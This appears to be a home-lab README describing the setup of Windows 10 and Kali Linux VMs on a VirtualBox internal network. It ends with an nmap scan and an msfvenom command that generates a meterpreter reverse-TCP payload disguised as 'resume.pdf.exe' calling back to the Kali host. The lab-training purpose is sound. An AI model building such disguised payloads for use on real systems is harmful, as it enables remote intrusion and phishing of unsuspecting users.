# Cybersecurity-HomeLab (on a Windows Machine) 

## Objective

Building a cybersecurity home-lab for offense and defense 

### Skills Learned

- Virtual Machines
- NAT network
- VM Snapshots
- VM Guest additions

  

### Tools Used

- VirtualBox
- https://www.youtube.com/watch?v=kku0fVfksrk
- 
  

### Steps to install all the ISO VM inside VirtualBox and config

- Download Windows 10 from Windows official website. https://www.microsoft.com/en-ca/software-download/windows10ISO
- Download Kali Linux from the official website and choose the virtual box option.
- When installing windows 10 make sure to add the ISO file and skip unattended installation.
- Open the Vbox file for Kali Linux to add it to VirtualBox

### Creating a internal network for the VMS

- We will choose internal network for all the VMs and name it.
- We will go to the Windows 10 machine and right-click on the internet icon and go to change adapter options
- We will go to options for the ethernet and find internet protocol 4 and click on properties and add the static IP addresses we want. (ip 192.168.20.10, subnet 255.255.255.0 and gateway empty)
- We can check the new IPs by going to CMD and ipconfig
- We will do the same to the Kali by going to the ethernet and right-click and edit connection
- We select the wired connection and then options.
- We go to IPv4 settings
- We select manual from the Method dropdown
- We will add new address, 192.168.20.11 and the netmask 24
- We go to terminal and ifconfig to check the static IP address we choose.

### Creating telemetry to detect evil

- We will go to Kali and then type nmap -A <the windows IP> -Pn and we look for an open port
- We can see port 3389/tcp open
- We will now create a malware using msfvenom
- We can see all the payloads by typing msfvenom -l payloads
- We will choose a meterpreter reverse tcp for windows
- We type msfvenom -p <then the payload we want to create> lhost=ip of kali lport=4444 -f exe -o resume.pdf.exe then we enter and the file will be created at the desktop
- 
